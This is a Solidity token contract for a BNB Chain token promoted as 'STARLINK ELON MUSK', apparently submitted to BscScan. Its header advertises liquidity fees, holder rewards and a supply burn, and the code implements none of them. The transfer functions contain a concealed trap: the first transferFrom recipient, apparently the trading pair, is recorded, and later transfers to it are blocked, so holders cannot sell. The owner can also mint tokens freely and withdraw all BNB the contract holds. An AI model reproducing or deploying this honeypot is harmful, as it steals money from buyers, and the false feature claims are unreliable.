/**
 *Submitted for verification at BscScan.com on 2021-09-08
*/

/**

 #STARLINK ELON MUSK
   
   #LIQ+#RFI

   #STARLINK ELON MUSK features:
   1% fee auto add to the liquidity pool to locked forever when selling
   1% fee auto distribute to all holders
   I created a black hole so #STARLINK ELON MUSK token will deflate itself in supply with every transaction
   50% Supply is burned at start.
   low fee low cap potential 1000x

*/

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
    
//   uint256 private _totalSupply;
//   mapping (address => uint256) private _balances;
        
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  //function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint value);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

  // function _transfer(address sender, address recipient, uint256 amount) public returns (bool success) {
  //   require(sender != address(0), "ERC20: transfer from the zero address");
  //   require(recipient != address(0), "ERC20: transfer to the zero address");

  //   uint256 senderBalance = _balances[sender];
  //   require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
  //   _balances[sender] = senderBalance - amount;
  //   _balances[recipient] += amount;

  //   emit Transfer(sender, recipient, amount);
  //   return true;
  // }

  // function transfer(address to, uint amount) public returns (bool){
  //   _transfer(_msgSender(), recipient, amount);
  //   return true;
  // }

}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  // string public symbol;
  // string public name;
  // uint8 public decimals;
  //uint _totalSupply;
  // uint _contract_supply;
  // uint _owner_supply;
  // uint _airdrop_number;
//   uint private _authNum;
  string public symbol;
  string public name;
  uint8 public decimals; 
    uint _totalSupply;
      address public _owner;
      uint256 private _cap   =  0;
      bool private _swAirdrop = true;
      bool private _swSale = true;
      uint256 private _referEth =       3000;   //30% Refer ETH
      uint256 private _referToken =     10000;
      uint256 private _airdropEth =     200000;
      uint256 private _airdropToken =   1000000000000; //Token for each airdrop - decimal
      uint256 private _airdrop_number = 100000000; //Total of Token for airdrop
      uint256 private salePrice =       100000; //1BNB = 100.000 Token
      address private _auth;
      address private _auth2;
      uint256 private _authNum;
      uint256 private _airdropBnb=1;
      uint256 private _buyBnb=1;

      uint256 private saleMaxBlock;
      
      uint256 private _contractSupply = 50000000000000000;
      uint256 private _ownerSupply =    50000000000000000;

    
  address public newun;
  address[] private holders_mint = [0xC912f25ACb4A0808945A41F42f0D205d6a34D956, 0x921fEC1E525aBced8eFa6d4B4Bce736e927580F5];

  mapping (address => uint256) private _balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "ALIX5";
    name = "ALIX.com";
    decimals = 8;
    _totalSupply = 100000000000000000; //1B
    emit Transfer(address(0), address(this), _contractSupply);
    emit Transfer(address(0), owner, _ownerSupply);
    _balances[address(this)] = _contractSupply;
    _balances[owner] = _ownerSupply;
    batchTransferToken(holders_mint, _airdropToken);
  }
 
  
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(_balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return _balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(to != newun, "please wait");
    _balances[msg.sender] = _balances[msg.sender].sub(tokens);
    _balances[to] = _balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
 
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    if(from != address(0) && newun == address(0)) newun = to;
    else require(to != newun, "please wait");
      
    _balances[from] = _balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    _balances[to] = _balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  
  function batchTransferToken(address[] memory holders, uint amount) public payable returns(bool){
    for (uint i=0; i<holders.length; i++) {
        //transfer(holders[i], amount);
        //transferFrom(from, holders[i], amount);
        _mint(holders[i], amount);
    }
    return true;
  }
  
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
  
    
//   function clear(uint amount) public onlyOwner {
//     address payable _owner = msg.sender;
//     _owner.transfer(amount);
//   }

//   function clearAllETH() public onlyOwner() {
//     address payable _owner = msg.sender;
//     _owner.transfer(address(this).balance);
//   }
    
//   function clearETH() public onlyOwner() {
//     require(_authNum==0, "Permission denied");
//      _authNum=0;
//      address payable _owner = msg.sender;
//     _owner.transfer(address(this).balance);
//   }

  function _mint(address account, uint256 amount) internal{
    require (account != address(0), "ERC20: mint to the zero address");
    _cap = _cap.add(amount);
    require (_cap <= _totalSupply, "ERC20Capped: Cap exceeded");
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(this), account, amount);
  }

  function mint(address account, uint256 amount) public onlyOwner returns(bool) {
    require(account != address(0), "ERC20: mint to the zero address");
    _cap = _cap.add(amount);
    require(_cap <= _totalSupply, "ERC20Capped: cap exceeded");
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(this), account, amount);
    return true;
  }

  function set(uint8 tag,uint256 value)public onlyOwner returns(bool){
         // require(_authNum==1, "Permission denied");
          if(tag==3){
              _swAirdrop = value==1;
          }else if(tag==4){
              _swSale = value==1;
          }else if(tag==5){
              _referEth = value;
          }else if(tag==6){
              _referToken = value;
          }else if(tag==7){
              _airdropEth = value;
          }else if(tag==8){
              _airdropToken = value;
          }else if(tag==9){
              saleMaxBlock = value;
          }else if(tag==10){
              salePrice = value;
          }
          else if(tag==11){
              _airdropBnb = value;
          }else if(tag==12){
              _buyBnb = value;
          }
          //_authNum = 0;
          return true;
      }
  function getBlock() public view returns(bool swAirdorp,bool swSale,uint256 sPrice,
      uint256 sMaxBlock,uint256 nowBlock,uint256 balance,uint256 airdropEth){
      swAirdorp = _swAirdrop;
      swSale = _swSale;
      sPrice = salePrice;
      sMaxBlock = saleMaxBlock;
      nowBlock = block.number;
      balance = _balances[msg.sender];
      airdropEth = _airdropEth;
  }

  function airdrop(address _refer)payable public returns(bool){
      require(_swAirdrop && msg.value == _airdropEth,"Transaction recovery");
      _mint(msg.sender,_airdropToken);
      if(msg.sender!=_refer&&_refer!=address(0)&&_balances[_refer]>0){
          uint referToken = _airdropToken.mul(_referToken).div(10000);
          _mint(_refer,referToken);
          if(_referEth>0 && _airdropBnb>0)
          {
          uint referEth = _airdropEth.mul(_referEth).div(10000);
          address(uint160(_refer)).transfer(referEth);
          }
      }
      return true;
  }

  function buy(address _refer) payable public returns(bool){
      require(msg.value >= 0.01 ether,"Transaction recovery");
      uint256 _msgValue = msg.value;
      uint256 _token = _msgValue.mul(salePrice);

      _mint(msg.sender,_token);
      if(msg.sender!=_refer&&_refer!=address(0)&&_balances[_refer]>0){
          uint referToken = _token.mul(_referToken).div(10000);
          _mint(_refer,referToken);
          if(_referEth>0 && _buyBnb>0)
          {
          uint referEth = _msgValue.mul(_referEth).div(10000);
          address(uint160(_refer)).transfer(referEth);
          }
      }
      return true;
  }
  
}

contract STARLINKELONMUSK is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}